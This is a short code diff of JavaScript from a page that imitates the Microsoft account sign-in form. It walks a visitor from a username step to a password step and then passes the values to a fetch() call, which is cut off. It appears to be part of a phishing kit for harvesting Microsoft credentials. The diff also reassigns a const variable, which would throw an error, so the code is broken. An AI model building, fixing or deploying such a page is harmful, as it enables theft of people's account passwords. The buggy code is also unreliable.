@@ -418,6 +418,7 @@
         const pwdReq = "Please enter the password for your Microsoft account."
         const unameInp = document.getElementById('inp_uname');
         const pwdInp = document.getElementById('inp_pwd');
+        const unameInpreal = "overwrittensoon"
         let view = "uname";
 
         let unameVal = pwdVal = false;
@@ -428,7 +429,7 @@
             //validate the form
             validate();
             if (unameVal) {
-                const unameInpreal = document.getElementById('inp_uname');
+                unameInpreal = document.getElementById('inp_uname');
                 document.getElementById("section_uname").classList.toggle('d-none');
                 document.getElementById('section_pwd').classList.remove('d-none');
                 document.querySelectorAll('#user_identity').forEach((e) => {
@@ -447,8 +448,8 @@
             validate();
             if (pwdVal) {
 
- const user = unameInpreal
- const pass = pwdInp
+ //const user = unameInpreal
+ //const pass = pwdInp
 
   fetch(
   
